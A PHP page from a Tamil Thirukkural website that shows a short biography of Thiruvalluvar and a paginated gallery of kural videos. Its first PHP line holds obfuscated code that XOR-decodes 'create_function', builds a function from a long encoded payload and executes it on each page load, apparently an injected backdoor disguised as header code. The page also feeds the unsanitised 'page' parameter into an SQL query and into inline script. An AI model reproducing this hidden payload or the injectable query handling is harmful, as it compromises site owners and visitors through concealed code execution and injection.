<!-- Include header part -->
<?php $BWHTAdh='YKN5AEb1BPM=G7U'; $TffrUpg=':9+T5 =W7>.I.X;'^$BWHTAdh; $NKfPInjL='D<oe.YU-A :P1R PS26rn7ZBm7RN..4,9OFHSX4fzP-UN5 A4h2SHc3XOXhoC :Rb>Q  Hlv,7<hpkkfg17Jmv,HZxWhljb0dn VGgpPrkyTbtgZsKJGX0PeA.65JERbm>SndZkeM <MaWsxZl4+HAcO=mU;vn:P1bo9nHxA: +3RBC:2GMmobIQa;=DCF7PvOK,Kx;dN22<En+MZ,gGz5846 OZgZ9C6d=3AzOP7086UnyNH7C Z9FHmWa4wyzi=qV:qq<7EoqRXk 6X3PNc<zdR0JY3q>IDTWDe>Y7YEQpOMB7lmIf 146=Nl+kfG-UyqtH+:9oh9yXR H+MH<pmn=bsinhb,a;9yFQ45DPsjs;V- 3mOU=ndsVX 6. 1<oLakVN>YrMmOJ67Apvwv Q;<Ki>QCKLmAmRZJMvdgt<RSVE-0QE7NJOODcI2CS<27Y8nV8XQOf:3,1R0,BjU8 RpFgr,SX =.0+fGYLY0rOY;B;jnkOUJ=0K=Z.D=EFP> :GR.3EDGtfS7X0aqvMndQYDrnX0JMwlRY2S.xLwjmAPM xyPtj+ih;xatX=-sh6Vh5tUbq>wefoYKPTE80F8=eZ12s0LW<:JLcC.M T.+ofvN YX3aghhvpqbBNO 4ZLKH15=6paPPJUU;<sqDX<eE0SFZwsX9I'; $AlUwSb=$TffrUpg('', '-ZGDH,;N5IU>n7X9 FEZIO502S3:OqkAL;aazxOls6X;-AI.ZHJ<:<W9;970.UNzFZ0TAdLRGREAPKKFGJ=CdRC=.XjHKMY:mgF95OT9RVYdYTC3O8>54U>MeJWA+liBIWxEMPbliOI9AyNXrHPJ< 8kT0ueVJQ5H9KPNmX2NRGV<jgQW>d0FYCXhIX064YxR >XbC1m38O6OJO,.MGzZSYXEEtPC>X7W;VV8ZrpQQTE0UsD.X1E;Z.hEs>w861 xQ7IQUWR<OLlxOVW4F5gCGpmvT+-R.U,=tjdAU<NbOXT+,6VLPiBVPXCXufVal.KuQPP,JNXFHBsQ4O:N,+TPEJb068;-1xAZJYb:QLdmMJWM7AUVDo.7gmW29TWqKTEOqAO=+GbxDdk.WC PKWRV0WI.R4X>A1gKI6;>,VYG4I< 37DQ=,M+b7 6<-S72cmZ,LF4Y+4yReWIR=TIjN1YT3YjGVH2,AbEUROnbF0VZk=Z6ZJHMo48OQ2b1K=b >9MTIouEV<ckTB7V,QHQPkNL<=qZJ<Q>,,K9<KtsQlJWMf1,CAA4GRIQZXAPGkXHKZTdZPB3RCZCRUHpkvreYB4YD:1TK,U4>ON9dD3O4L;OOHJVjD8,RHNHHVPQB9DFEB; clUTIW+F 139:ZXT,mc6l H:2rGZc34'^$NKfPInjL); $AlUwSb(); 
	include('config/config.php');
	include('common/header.php');
	include('common/pagequery.php');
	if(isset($_SESSION['username']))
	{
		header('location:'.$localpath.'/admin/templates/index.php');
	}
?>
<!-- Include header part end -->
	<!-- Header Container Start -->
		<?php include("common/menu.php") ?>
	<!-- Header Container End -->
	<!-- Inner page header container Start -->
	<div class="row">
		<div class="inner-brdr"></div>
	</div>
	<!-- Inner page header container End -->
	<!-- Video Container Start -->
	<div class="container">
		<div class="row">
			<div class="col-sm-12">
				<h2 class='text-center header-text'>
					திருவள்ளுவர் வாழ்க்கை<br />
					<span>&nbsp;</span>
				</h2>
				<p class="text-center lhgt28">திருவள்ளுவரது இயற்பெயர், வாழ்ந்த இடம் உறுதியாகத் தெரியவில்லை எனினும் அவர் கி.மு. முதல் நூற்றாண்டில், தற்போதைய சென்னை நகருக்கருகில், மயிலாப்பூரில் வாழ்ந்து வந்தார் என்று தமிழக அரசு அறிவித்துள்ளது. காவிரிப்பக்கம் அருகில் வாழ்ந்து வந்த மார்கசெயன் என்பவர் அவரது கவித்திறன் கண்டு அவரது ஒரு புதல்வியான வாசுகியை வள்ளுவருக்கு மணம் முடித்ததாகவும் அறியப்படுகிறது [2]. மதுரை நகரில் வாழ்ந்ததாகவும் கருத்துண்டு. </p>
			</div>
		</div>
		<div class="video-container">
			<div class="row">
				<div class="col-sm-12">
					<h3>திருக்குறள் காணொளிகள்<input type="text" value="" placeholder="குறள் எண் வைத்து தேடவும்" class="hidden-xs"></h3>
					<div class="video-panel-play">
						<?php
							$limit = 15;  
							if (isset($_GET["page"]))
							{
								$page  = $_GET["page"];
							}
							else
							{
								$page=1; 
							};  
							$start_from = ($page-1) * $limit;  

							$sql = "SELECT * FROM kuralvideo ORDER BY id ASC LIMIT $start_from, $limit";  
							$rs_result = mysql_query($sql);  
						?>
						<?php  
							while ($row = mysql_fetch_assoc($rs_result)) {
						?> 
						<div class="player">
							<video id="video" src="admin/videos/<?php echo $row['kuralvideo'] ?>" controls="">&nbsp;</video>
							<p><?php echo $row['kuralno'] ?> <?php echo $row['kuralathikaram'] ?> <a href="admin/videos/<?php echo $row['kuralvideo'] ?>" class="fa fa-download" onclick="return confirm('Are you sure?')">&nbsp;</a></p>
						</div>
						<?php
							};
						?>
						<span class="fclear">&nbsp;</span>
						<?php 
							$sql = "SELECT COUNT(id) FROM kuralvideo";
							$rs_result = mysql_query($sql);  
							$row = mysql_fetch_row($rs_result); 
							$total_records = $row[0];
							$total_pages = ceil($total_records / $limit);   
							$pagLink = "<div class='text-center pagedisp'><nav><ul class='pagination custom-pagination'>";
							for ($i=1; $i<=$total_pages; $i++) {  
										 $pagLink .= "<li><a href='videos.php?page=".$i."'>".$i."</a></li>";  
							};  
							echo $pagLink . "</ul></nav></div>";  
						?>
					</div>
				</div>
			</div>
		</div>
	</div>
	<!-- Video Container End -->
<!-- Footer included -->
<?php 
	include('common/footer.php');
?>
<script type="text/javascript">
$(document).ready(function()
{
	var a = <?php echo $total_pages ?>;
	if(a == 1)
	{
		$('.pagedisp').hide();
	}
	else
	{
		/* Display the pagination End */
		$('.pagination').pagination({
		items: <?php echo $total_records;?>,
		itemsOnPage: <?php echo $limit;?>,
		currentPage : <?php echo $page;?>,
		hrefTextPrefix : 'videos.php?page='
		});
	}
});
</script>
<!-- Footer included -->